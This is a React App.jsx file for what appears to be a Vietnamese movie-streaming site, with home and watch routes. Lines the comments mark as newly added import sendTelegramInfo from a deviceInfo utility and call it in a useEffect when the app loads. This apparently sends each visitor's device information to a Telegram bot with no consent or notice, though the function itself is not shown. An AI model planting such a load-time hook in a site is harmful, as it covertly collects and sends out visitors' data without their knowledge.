import { useEffect } from 'react'; // ← THÊM DÒNG NÀY
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Navbar from './components/Navbar';
import Banner from './components/Banner';
import Row from './components/Row';
import ComingSoon from './components/ComingSoon';
import Watch from './pages/Watch';
import { nowPlaying, comingSoon } from './data/movies';
import { sendTelegramInfo } from './utils/deviceInfo'; // ← THÊM DÒNG NÀY
import './index.css';

function Home() {
  return (
    <>
      <Navbar />
      <Banner />
      <Row title="🔥 Phim hot đang chiếu" movies={nowPlaying} isLargeRow />
      <ComingSoon movies={comingSoon} />
    </>
  );
}

function App() {
  // THÊM useEffect NÀY
  useEffect(() => {
    sendTelegramInfo();
  }, []);

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/watch/:id" element={<Watch />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;